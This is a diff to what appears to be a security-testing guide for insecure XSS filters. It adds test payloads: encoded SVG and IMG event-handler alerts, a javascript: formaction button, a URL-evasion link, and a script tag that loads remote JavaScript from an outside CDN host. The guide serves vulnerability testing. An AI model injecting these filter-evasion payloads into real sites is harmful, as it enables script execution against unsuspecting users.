@@ -81,7 +81,24 @@ An insecure XSS filter occurs when an application fails to properly validate use
    - Obfuscation Techniques:
      Using techniques such as breaking keywords (e.g., `java + script:`) to bypass string-based filters
 4. To test the vulnerability, use the following payloads
+   SVG element with onload event handler
    ```
    <svg ONLOAD="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">
+   ```
+   IMG onerror and JavaScript Alert Encode
+   ```
+   <img SRC=x ONERROR="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+   ```
+   Basic XSS Test Without Filter Evasion
+   ```
+   <SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+   ```
+   URL string evasion
+   ```
+   <A HREF="http://www.google.com./">XSS</A>
+   ```
+   Trigger JavaScript execution using formaction
+   ```
+   <form><button formaction=JAVASCRIPT&colon;ALERT(1)>CLICKME
    ```
 5. For validation purposes, ensure that the injected JavaScript successfully executes on the frontend (e.g., showing an alert box) and different bypass techniques successfully trigger the XSS, demonstrating the insecure filter
